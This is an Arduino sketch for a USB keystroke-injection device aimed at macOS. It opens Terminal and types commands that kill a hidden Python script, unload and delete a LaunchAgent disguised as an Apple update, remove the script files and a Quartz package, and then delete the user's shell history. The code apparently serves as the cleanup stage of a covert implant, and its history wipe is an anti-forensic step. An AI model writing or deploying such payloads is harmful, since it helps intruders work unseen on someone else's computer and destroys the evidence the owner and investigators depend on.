#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' ');
  delay(100); Keyboard.releaseAll(); delay(1200);
  t("Terminal"); delay(500);
  Keyboard.write(KEY_RETURN); delay(4000);

  // Kill any running instances (all versions)
  ln("pkill -f .j.py 2>/dev/null;pkill -f j.py 2>/dev/null");
  delay(300);

  // Unload LaunchAgent before deleting it
  ln("launchctl unload ~/Library/LaunchAgents/com.apple.update.plist 2>/dev/null");
  delay(300);

  // Remove script from every location ever used
  ln("rm -f /tmp/.j.py ~/.j.py ~/Library/.j.py /tmp/j.py ~/j.py");

  // Remove LaunchAgent
  ln("rm -f ~/Library/LaunchAgents/com.apple.update.plist");

  // Remove nohup leftovers
  ln("rm -f ~/nohup.out /tmp/nohup.out");

  // Uninstall the pip package
  ln("python3 -m pip uninstall pyobjc-framework-Quartz -y -q 2>/dev/null");
  delay(3000);

  // Wipe history and clear
  ln("rm -f ~/.zsh_history ~/.bash_history");
  ln("clear");

  Keyboard.end();
}
void loop() {}
